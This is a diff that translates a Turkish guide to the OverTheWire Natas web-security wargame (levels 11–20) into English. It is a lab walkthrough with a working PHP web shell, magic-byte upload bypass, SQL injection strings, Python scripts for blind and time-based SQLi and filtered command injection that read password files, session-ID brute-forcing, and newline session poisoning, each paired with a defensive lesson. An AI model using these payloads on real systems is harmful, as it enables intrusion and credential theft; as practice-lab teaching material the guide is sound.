@@ -1,204 +1,204 @@
-# 🌐 OverTheWire: Natas — Level 11'den Level 20'ye Türkçe Rehber
+# 🌐 OverTheWire: Natas — Level 11 to Level 20 English Guide
 
-> Bu bölümde işler ciddileşiyor: XOR şifre kırma, dosya yükleme saldırıları,  
-> SQL injection, blind SQLi ve session/cookie manipülasyonu.  
-> Python scriptleri yazmaya başlıyoruz!
+> Things get serious in this section: XOR cipher cracking, file upload attacks,  
+> SQL injection, blind SQLi, and session/cookie manipulation.  
+> We start writing Python scripts!
 
-**Önceki bölüm:** [natas_0-10.md](./natas_0-10.md)  
-**Referans:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-7-13/)
+**Previous section:** [natas_0-10.md](./natas_0-10.md)  
+**Reference:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-7-13/)
 
 ---
 
-## 🗺️ Genel Bakış
+## 🗺️ Overview
 
-| Level | Konu | Teknik |
+| Level | Topic | Technique |
 |---|---|---|
-| 11 → 12 | XOR cookie şifrelemesi | Cookie kırma + CyberChef |
-| 12 → 13 | Dosya yükleme (File Upload) | Web shell yükleme |
+| 11 → 12 | XOR cookie encryption | Cookie cracking + CyberChef |
+| 12 → 13 | File Upload | Web shell upload |
 | 13 → 14 | Magic byte bypass | JPEG header + PHP web shell |
 | 14 → 15 | SQL Injection | `OR "1"="1"` bypass |
 | 15 → 16 | Blind SQL Injection | Python brute-force |
-| 16 → 17 | Komut enjeksiyonu (filtreli) | `$()` ile grep çıktısı sızdırma |
-| 17 → 18 | Time-based Blind SQLi | `SLEEP()` ile karakter tespiti |
-| 18 → 19 | Session ID brute-force | Python ile 640 olası ID deneme |
-| 19 → 20 | Hex-encoded session | ID formatını tersine çevir |
-| 20 → 21 | Session enjeksiyonu | Newline `%0A` ile session poisoning |
+| 16 → 17 | Command injection (filtered) | Leaking via grep output with `$()` |
+| 17 → 18 | Time-based Blind SQLi | Detecting characters with `SLEEP()` |
+| 18 → 19 | Session ID brute-force | Trying 640 possible IDs with Python |
+| 19 → 20 | Hex-encoded session | Reverse the ID format |
+| 20 → 21 | Session injection | Session poisoning with newline `%0A` |
 
 ---
 
-## Level 11 → Level 12 — XOR Cookie Kırma
+## Level 11 → Level 12 — XOR Cookie Cracking
 
-### 🎯 Görev
-Site arka plan rengini XOR şifreli cookie'de saklıyor. `showpassword=yes` yapacak yeni bir cookie oluştur.
+### 🎯 Task
+The site stores background color in an XOR-encrypted cookie. Create a new cookie that sets `showpassword=yes`.
 
-### 📖 Teori: XOR Şifreleme ve Cookie Kırma
+### 📖 Theory: XOR Encryption and Cookie Cracking
 
-**XOR özelliği:**
+**XOR property:**
 ```
 plaintext XOR key = ciphertext
 ciphertext XOR key = plaintext
-ciphertext XOR plaintext = key   ← bunu kullanacağız!
+ciphertext XOR plaintext = key   ← this is what we'll use!
 ```
 
-Cookie oluşturma: `json_encode → XOR → base64_encode`  
-Cookie okuma: `base64_decode → XOR → json_decode`
+Cookie creation: `json_encode → XOR → base64_encode`  
+Cookie reading: `base64_decode → XOR → json_decode`
 
-Eğer hem şifreli cookie'yi hem de şifresiz içeriğini biliyorsak → ikisini XOR'layınca anahtarı buluruz!
+If we know both the encrypted cookie and its unencrypted content → XORing them reveals the key!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
-**Adım 1 — Mevcut cookie'yi al:**
+**Step 1 — Get the current cookie:**
 ```
 F12 → Application/Storage → Cookies
-"data" cookie değerini kopyala
-Örn: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
+Copy the "data" cookie value
+e.g.: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
 ```
 
-**Adım 2 — Aynı değerlerin şifresiz base64'ünü üret:**
+**Step 2 — Generate the base64 of the same values unencrypted:**
 ```
 {"showpassword":"no","bgcolor":"#ffffff"}
 → base64: eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=
 ```
 
-**Adım 3 — CyberChef ile XOR → anahtarı bul:**
-1. [CyberChef](https://gchq.github.io/CyberChef/) aç
-2. Cookie değerini → "From Base64" işlemi
-3. Sonucu → "XOR" işlemi (key: base64 encoded plaintext)
-4. Anahtar: `qw8J` (tekrar ediyor)
+**Step 3 — Find the key with CyberChef XOR:**
+1. Open [CyberChef](https://gchq.github.io/CyberChef/)
+2. Cookie value → "From Base64" operation
+3. Result → "XOR" operation (key: base64 encoded plaintext)
+4. Key: `qw8J` (repeating)
 
-**Adım 4 — Yeni cookie oluştur (`showpassword=yes`):**
+**Step 4 — Create a new cookie (`showpassword=yes`):**
 1. `{"showpassword":"yes","bgcolor":"#ffffff"}` → XOR (key: `qw8J`) → Base64
-2. Yeni cookie değeri: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
+2. New cookie value: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`
 
-**Adım 5 — Cookie'yi değiştir:**
+**Step 5 — Replace the cookie:**
 ```
 F12 → Application/Storage → Cookies
-"data" değerini yeni değerle değiştir → sayfayı yenile
+Replace "data" value with new value → refresh the page
 ```
 
-> 💡 **Ders:** Kısa ve tekrar eden XOR anahtarı güvenli şifreleme değildir. Aynı key ile birden fazla mesaj şifrelenirse key ortaya çıkar.
+> 💡 **Lesson:** A short and repeating XOR key is not secure encryption. If multiple messages are encrypted with the same key, the key is revealed.
 
 ---
 
-## Level 12 → Level 13 — Web Shell Yükleme (File Upload)
+## Level 12 → Level 13 — Web Shell Upload (File Upload)
 
-### 🎯 Görev
-Resim yükleme formu var. PHP web shell yükleyip sunucuda komut çalıştır.
+### 🎯 Task
+There's an image upload form. Upload a PHP web shell and run commands on the server.
 
-### 📖 Teori: Web Shell ve Client-Side Bypass
+### 📖 Theory: Web Shell and Client-Side Bypass
 
-**Web Shell:** Sunucuya yüklenen, HTTP üzerinden komut çalıştırmaya olanak tanıyan script.
+**Web Shell:** A script uploaded to the server that allows command execution over HTTP.
 
-Kaynak kodda dosya adı client-side'da `.jpg` uzantısına zorlanıyor — ama bu HTML'de yapılıyor, sunucu tarafında değil! DevTools ile değiştirilebilir.
+In the source code, the filename is forced to `.jpg` extension on the client-side — but this is done in HTML, not on the server! It can be changed via DevTools.
 
 ```php
 <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 ```
-Bu web shell `?e=komut` ile çalışır.
+This web shell runs via `?e=command`.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. shell.php dosyası oluştur:
+1. Create shell.php:
    <?php echo shell_exec($_GET['e'].' 2>&1'); ?>
 
-2. F12 → Elements → upload formunu bul
-   Gizli input'ta filename uzantısını ".jpg"den ".php"ye değiştir
+2. F12 → Elements → find the upload form
+   Change the filename extension in the hidden input from ".jpg" to ".php"
 
-3. shell.php'yi yükle → sunucu .php olarak kabul eder
+3. Upload shell.php → server accepts it as .php
 
-4. Verilen URL'ye git + ?e= ekle:
+4. Navigate to the given URL + add ?e=:
    http://natas12.natas.labs.overthewire.org/upload/abc123.php?e=cat /etc/natas_webpass/natas13
 ```
 
-> 💡 **Ders:** Client-side filtering (tarayıcıda yapılan kontroller) güvenlik sağlamaz. Dosya tipi kontrolü sunucu tarafında MIME type ve içerik kontrolüyle yapılmalı.
+> 💡 **Lesson:** Client-side filtering (browser-side checks) provides no security. File type verification must be done server-side with MIME type and content checks.
 
 ---
 
 ## Level 13 → Level 14 — Magic Byte Bypass (JPEG Header)
 
-### 🎯 Görev
-Artık `exif_imagetype()` ile dosyanın gerçekten resim olup olmadığı kontrol ediliyor. Yine de PHP shell yükle.
+### 🎯 Task
+Now `exif_imagetype()` checks whether the file is actually an image. Still upload a PHP shell.
 
-### 📖 Teori: Magic Byte / Dosya İmzası
+### 📖 Theory: Magic Bytes / File Signature
 
-Her dosya tipi başında özel byte'lar (magic bytes) taşır:
-- JPEG: `FF D8 FF` (ya da `GIF87a`)
+Every file type carries special bytes at the beginning (magic bytes):
+- JPEG: `FF D8 FF` (or `GIF87a`)
 - PNG: `89 50 4E 47`
 
-`exif_imagetype()` bu byte'lara bakarak dosya tipini belirler. Eğer dosyanın başına gerçek bir JPEG header koyarsak, PHP kodu ekleyebiliriz!
+`exif_imagetype()` checks these bytes to determine the file type. If we put a real JPEG header at the beginning of the file, we can still add PHP code!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. shell.php dosyası oluştur:
+1. Create shell.php:
    GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
-   (GIF87a = GIF magic header, server bunu resim sanır)
+   (GIF87a = GIF magic header, server thinks it's an image)
 
-2. F12 → Elements → filename uzantısını ".php"ye değiştir
+2. F12 → Elements → change filename extension to ".php"
 
-3. Dosyayı yükle
+3. Upload the file
 
-4. Yüklenen URL + ?e=cat /etc/natas_webpass/natas14
+4. Uploaded URL + ?e=cat /etc/natas_webpass/natas14
 ```
 
-> 💡 **Ders:** Dosya tipi kontrolü sadece magic byte'a bakılarak yapılmamalı. İçerik analizi, whitelist ve execution yetkisi kısıtlaması gerekli.
+> 💡 **Lesson:** File type verification shouldn't rely only on magic bytes. Content analysis, whitelisting, and execution permission restrictions are required.
 
 ---
 
 ## Level 14 → Level 15 — SQL Injection
 
-### 🎯 Görev
-Login formu var. SQL injection ile kimlik doğrulamayı atla.
+### 🎯 Task
+There's a login form. Bypass authentication with SQL injection.
 
-### 📖 Teori: SQL Injection
+### 📖 Theory: SQL Injection
 
-PHP kaynak kodu:
+PHP source code:
 ```php
 $query = "SELECT * from users where username=\"" . $_REQUEST["username"] . 
          "\" and password=\"" . $_REQUEST["password"] . "\"";
 ```
 
-Kullanıcı girdisi doğrudan SQL sorgusuna dahil ediliyor! Şu girişi düşün:
+User input is included directly in the SQL query! Consider this input:
 ```
 password: anything" or "1" = "1
 ```
 
-Oluşan sorgu:
+The resulting query:
 ```sql
 SELECT * FROM users WHERE username="admin" AND password="anything" OR "1"="1"
 ```
 
-`"1"="1"` her zaman doğru → WHERE koşulu her zaman true → tüm kullanıcılar döner → giriş başarılı!
+`"1"="1"` is always true → WHERE condition is always true → all users returned → login successful!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
 Username: admin
 Password: anything" or "1"="1
 
-→ "Access granted" ve şifre görünür
+→ "Access granted" and password visible
 ```
 
-**curl ile:**
+**With curl:**
 ```bash
 curl 'http://natas14.natas.labs.overthewire.org/' \
-  -u natas14:<şifre> \
+  -u natas14:<password> \
   --data-raw 'username=admin&password=anything" or "1"="1&debug='
 ```
 
-> 💡 **Ders:** Kullanıcı girdisi asla doğrudan SQL sorgusuna eklenmemeli. Prepared statements (parametreli sorgular) kullan!
+> 💡 **Lesson:** User input should never be added directly to a SQL query. Use prepared statements (parameterized queries)!
 
 ---
 
 ## Level 15 → Level 16 — Blind SQL Injection (Python Brute-force)
 
-### 🎯 Görev
-Bu sefer sadece "kullanıcı var/yok" bilgisi alıyoruz, şifreyi direkt göremiyoruz. Blind SQLi ile karakteri karakterine brute-force yap.
+### 🎯 Task
+This time we only get "user exists/doesn't exist" information. Brute-force character by character with Blind SQLi.
 
-### 📖 Teori: Blind SQL Injection
+### 📖 Theory: Blind SQL Injection
 
-Kaynak kodda:
+In the source code:
 ```php
 if(mysqli_num_rows($res) > 0) {
     echo "This user exists.";
@@ -207,20 +207,20 @@ if(mysqli_num_rows($res) > 0) {
 }
 ```
 
-Direkt hata yok ama "var/yok" cevabı binary bilgi veriyor. Her karakteri tek tek sorgulayabiliriz:
+No direct error but the "exists/doesn't" response gives binary information. We can query each character individually:
 ```sql
 username: natas16" AND password LIKE BINARY "a%" --
 ```
-Eğer "This user exists" dönerse → şifre 'a' ile başlıyor!
+If "This user exists" is returned → password starts with 'a'!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 import string
 
 url = "http://natas15.natas.labs.overthewire.org/index.php"
-auth = ("natas15", "<şifre>")
+auth = ("natas15", "<password>")
 charset = string.ascii_letters + string.digits
 
 found = ""
@@ -230,43 +230,43 @@ for i in range(1, 33):
         res = requests.post(url, data={"username": payload}, auth=auth)
         if "This user exists." in res.text:
             found += ch
-            print(f"[+] Bulunan: {found}")
+            print(f"[+] Found: {found}")
             break
 
-print(f"\n[✅] Şifre: {found}")
+print(f"\n[✅] Password: {found}")
 ```
 
-> 💡 **Ders:** Hata mesajı olmasa bile "var/yok" gibi boolean cevaplar bilgi sızdırır. LIKE BINARY büyük/küçük harf duyarlı arama yapar.
+> 💡 **Lesson:** Even without error messages, boolean responses like "exists/doesn't" leak information. LIKE BINARY performs case-sensitive search.
 
 ---
 
-## Level 16 → Level 17 — Filtreli Komut Enjeksiyonu (grep ile sızdırma)
+## Level 16 → Level 17 — Filtered Command Injection (grep leaking)
 
-### 🎯 Görev
-Artık `; | & ' "` karakterleri filtreleniyor. Başka yol bul.
+### 🎯 Task
+Now `; | & ' "` characters are filtered. Find another way.
 
-### 📖 Teori: `$()` ile Komut İkamesi
+### 📖 Theory: Command Substitution with `$()`
 
-`$()` (command substitution) bash'te bir komutun çıktısını başka bir komuta argüman olarak geçirir. Bu karakterler filtrelenmemiş!
+`$()` (command substitution) passes a command's output as an argument to another command in bash. These characters are not filtered!
 
 ```bash
-# Eğer grep'in arama terimi içinde $() kullanılırsa:
+# If $() is used inside grep's search term:
 grep -i "$(grep ^a /etc/natas_webpass/natas17)anything" dictionary.txt
 
-# Eğer şifre 'a' ile başlıyorsa:
-# → inner grep bir şey döner → outer grep hiçbir şey bulamaz ("anything" yok)
-# Eğer 'a' ile başlamıyorsa:
-# → inner grep boş döner → outer grep "anything" kelimesini arar → sonuç döner
+# If password starts with 'a':
+# → inner grep returns something → outer grep finds nothing ("anything" not found)
+# If doesn't start with 'a':
+# → inner grep returns empty → outer grep searches "anything" → returns result
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 import string
 
 url = "http://natas16.natas.labs.overthewire.org/"
-auth = ("natas16", "<şifre>")
+auth = ("natas16", "<password>")
 charset = string.ascii_letters + string.digits
 
 found = ""
@@ -276,38 +276,38 @@ for i in range(1, 33):
         res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
         if "anything" not in res.text:
             found += ch
-            print(f"[+] Bulunan: {found}")
+            print(f"[+] Found: {found}")
             break
 
-print(f"[✅] Şifre: {found}")
+print(f"[✅] Password: {found}")
 ```
 
-> 💡 **Ders:** Blacklist tabanlı filtreler yetersizdir. `$()`, backtick gibi alternatif injection yolları var. Whitelist kullan!
+> 💡 **Lesson:** Blacklist-based filters are insufficient. There are alternative injection paths like `$()`, backtick. Use a whitelist!
 
 ---
 
 ## Level 17 → Level 18 — Time-Based Blind SQL Injection
 
-### 🎯 Görev
-Artık hiçbir mesaj yok — ekranda "var/yok" bile çıkmıyor. `SLEEP()` ile yanıt süresine bakarak karakterleri bul.
+### 🎯 Task
+Now there are no messages at all. Use `SLEEP()` to find characters by checking response time.
 
-### 📖 Teori: Time-Based Blind SQLi
+### 📖 Theory: Time-Based Blind SQLi
 
-Ekranda hiçbir şey görünmese de sunucu işlem yapar. `IF(koşul, SLEEP(5), 0)` ile:
-- Koşul doğruysa → sunucu 5 saniye bekler → response geç gelir
-- Koşul yanlışsa → anında döner
+Even if nothing appears on screen, the server still processes. With `IF(condition, SLEEP(5), 0)`:
+- If condition is true → server waits 5 seconds → response comes late
+- If condition is false → returns immediately
 
 ```sql
 username: natas18" AND IF(BINARY SUBSTRING(password,1,1)="a", SLEEP(5), 0) -- -
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests, string
 
 url = "http://natas17.natas.labs.overthewire.org/"
-auth = ("natas17", "<şifre>")
+auth = ("natas17", "<password>")
 charset = string.ascii_letters + string.digits
 
 found = ""
@@ -317,24 +317,24 @@ for pos in range(1, 33):
         r = requests.post(url, data={"username": payload}, auth=auth)
         if r.elapsed.total_seconds() > 5:
             found += ch
-            print(f"[+] Bulunan: {found}")
+            print(f"[+] Found: {found}")
             break
 
-print(f"[✅] Şifre: {found}")
+print(f"[✅] Password: {found}")
 ```
 
-> 💡 **Ders:** Hiçbir çıktı olmasa bile timing (süre) bilgi sızdırır. Ağ gecikmesi için eşiği 4-5 saniye ayarlamak yeterli.
+> 💡 **Lesson:** Even without any output, timing leaks information. Setting the threshold to 4-5 seconds accounts for network latency.
 
 ---
 
 ## Level 18 → Level 19 — Session ID Brute-force
 
-### 🎯 Görev
-Admin session'ı almak için `PHPSESSID` değerini 1-640 arasında brute-force yap.
+### 🎯 Task
+Brute-force the `PHPSESSID` value between 1-640 to get the admin session.
 
-### 📖 Teori: Session ID ve Güvenlik
+### 📖 Theory: Session ID and Security
 
-PHP session ID'leri genellikle rastgele ve uzun olur. Ama bu level 1-640 arası basit integer kullanıyor — brute-force mümkün!
+PHP session IDs are usually random and long. But this level uses simple integers between 1-640 — brute-force is possible!
 
 ```
 PHPSESSID=1 → normal user
@@ -343,141 +343,141 @@ PHPSESSID=2 → normal user
 PHPSESSID=119 → admin!
 ```
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
 url = "http://natas18.natas.labs.overthewire.org/index.php"
-auth = ("natas18", "<şifre>")
+auth = ("natas18", "<password>")
 
 for i in range(0, 641):
     headers = {'Cookie': f'PHPSESSID={i}'}
     response = requests.get(url, headers=headers, auth=auth)
-    print(f'[+] Deneniyor: {i}')
+    print(f'[+] Trying: {i}')
     if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
         print(f"\n[✅] Admin PHPSESSID: {i}")
         print(response.text[:500])
         break
 ```
 
-Doğru ID'yi bulunca tarayıcıda cookie'yi manuel değiştir → şifre görünür.
+Once you find the correct ID, manually change the cookie in the browser → password appears.
 
-> 💡 **Ders:** Session ID'ler kısa ve tahmin edilebilir olmamalı. Kriptografik rastgelelik şart.
+> 💡 **Lesson:** Session IDs must not be short and predictable. Cryptographic randomness is mandatory.
 
 ---
 
 ## Level 19 → Level 20 — Hex-Encoded Session Format
 
-### 🎯 Görev
-Session ID artık basit integer değil — hex encoded `id-kullanıcı` formatında. `admin` için doğru hex'i bul.
+### 🎯 Task
+Session ID is no longer a simple integer — it's in hex encoded `id-username` format. Find the correct hex for `admin`.
 
-### 📖 Teori: Session ID Format Analizi
+### 📖 Theory: Session ID Format Analysis
 
 ```
-Giriş: user=test → PHPSESSID: 37342d74657374
+Login: user=test → PHPSESSID: 37342d74657374
 Decode: 37 34 2d 74 65 73 74 → "74-test"
 ```
 
-Format: `{id}-{username}` → hex encoded. Admin için: `{id}-admin` → hex.
+Format: `{id}-{username}` → hex encoded. For admin: `{id}-admin` → hex.
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```python
 import requests
 
 url = "http://natas19.natas.labs.overthewire.org/index.php"
-auth = ("natas19", "<şifre>")
+auth = ("natas19", "<password>")
 
 for i in range(0, 641):
     value = f"{i}-admin"
     hex_data = value.encode('utf-8').hex()
     headers = {'Cookie': f'PHPSESSID={hex_data}'}
-    print(f'[+] Deneniyor: {value}')
+    print(f'[+] Trying: {value}')
     response = requests.get(url, headers=headers, auth=auth)
     if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
         print(f"\n[✅] Admin: {value} / Hex: {hex_data}")
         break
 ```
 
-Doğru hex değerini tarayıcı cookie'sine yaz → şifre görünür.
+Write the correct hex value into the browser cookie → password appears.
 
 ---
 
-## Level 20 → Level 21 — Session Dosyasına Enjeksiyon (Newline)
+## Level 20 → Level 21 — Session File Injection (Newline)
 
-### 🎯 Görev
-Session verisine `admin=1` satırı ekle. `%0A` (newline) ile session dosyasına yeni satır enjekte et.
+### 🎯 Task
+Add an `admin=1` line to the session data. Inject a new line into the session file with `%0A` (newline).
 
-### 📖 Teori: Session File Injection
+### 📖 Theory: Session File Injection
 
-PHP session dosyaları `key value` formatında satır satır saklanır:
+PHP session files are stored line by line in `key value` format:
 ```
 name|s:4:"test";
 ```
 
-Eğer değere newline (`\n` / `%0A`) ekleyebiliyorsak, yeni satır eklenir:
+If we can insert a newline (`\n` / `%0A`) into the value, a new line is added:
 ```
 name|s:14:"test
 admin 1";
 ```
-→ Session dosyasında `admin = 1` satırı oluşur!
+→ An `admin = 1` line is created in the session file!
 
-### 🔧 Çözüm
+### 🔧 Solution
 
 ```
-1. "Your name" alanına gir:
+1. Enter in the "Your name" field:
    admin%0Aadmin 1
    (%0A = URL-encoded newline)
 
-2. Formu gönder
+2. Submit the form
 
-3. Sayfayı yenile → admin=1 okunur → şifre görünür
+3. Refresh the page → admin=1 is read → password appears
 ```
 
-**curl ile:**
+**With curl:**
 ```bash
-# Önce yaz
+# First write
 curl -c /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
-  -u natas20:<şifre> \
+  -u natas20:<password> \
   --data-raw 'name=admin%0Aadmin+1&submit=Submit'
 
-# Sonra oku
+# Then read
 curl -b /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
-  -u natas20:<şifre>
+  -u natas20:<password>
 ```
 
-> 💡 **Ders:** Session verisi asla kullanıcı girdisiyle doğrudan oluşturulmamalı. Newline karakterleri özellikle tehlikeli — sanitize et!
+> 💡 **Lesson:** Session data should never be created directly from user input. Newline characters are especially dangerous — sanitize them!
 
 ---
 
-## 📚 Öğrenilen Web Güvenliği Kavramları (Level 11-20)
+## 📚 Web Security Concepts Learned (Level 11-20)
 
-| Kavram | Açıklama |
+| Concept | Description |
 |---|---|
-| **XOR Cookie Kırma** | Bilinen plaintext + ciphertext → key |
-| **Web Shell** | Sunucuya yüklenen komut çalıştırma scripti |
-| **Magic Byte Bypass** | Dosya başına gerçek header koyarak tip kontrolünü atlatma |
-| **SQL Injection** | Kullanıcı girdisiyle SQL sorgusunu manipüle etme |
-| **Blind SQLi (Boolean)** | "var/yok" cevabından bilgi sızdırma |
-| **Blind SQLi (Time-based)** | Yanıt süresinden bilgi sızdırma |
-| **Command Injection (filtreli)** | `$()` ile alternatif injection |
-| **Session ID Brute-force** | Zayıf session ID'leri deneme |
-| **Session Injection** | Newline ile session dosyasına satır ekleme |
+| **XOR Cookie Cracking** | Known plaintext + ciphertext → key |
+| **Web Shell** | Command execution script uploaded to server |
+| **Magic Byte Bypass** | Bypassing type checking by putting real header at file start |
+| **SQL Injection** | Manipulating SQL query with user input |
+| **Blind SQLi (Boolean)** | Leaking information from "exists/doesn't" response |
+| **Blind SQLi (Time-based)** | Leaking information from response time |
+| **Command Injection (filtered)** | Alternative injection with `$()` |
+| **Session ID Brute-force** | Trying weak session IDs |
+| **Session Injection** | Adding a line to session file with newline |
 
-## 📚 Kullanılan Araçlar
+## 📚 Tools Used
 
-| Araç | Ne için |
+| Tool | Purpose |
 |---|---|
-| [CyberChef](https://gchq.github.io/CyberChef/) | XOR, base64, hex işlemleri |
-| `F12 DevTools` | Cookie, element düzenleme |
-| `curl` | HTTP isteği gönderme |
-| `Python requests` | Otomatik brute-force scriptleri |
+| [CyberChef](https://gchq.github.io/CyberChef/) | XOR, base64, hex operations |
+| `F12 DevTools` | Cookie, element editing |
+| `curl` | Sending HTTP requests |
+| `Python requests` | Automated brute-force scripts |
 | `xxd -r -p` | Hex decode |
 
 ---
 
-**Önceki bölüm:** [natas_0-10.md](./natas_0-10.md)  
-**Sonraki bölüm:** [natas_21-34.md](./natas_21-34.md)
+**Previous section:** [natas_0-10.md](./natas_0-10.md)  
+**Next section:** [natas_21-34.md](./natas_21-34.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
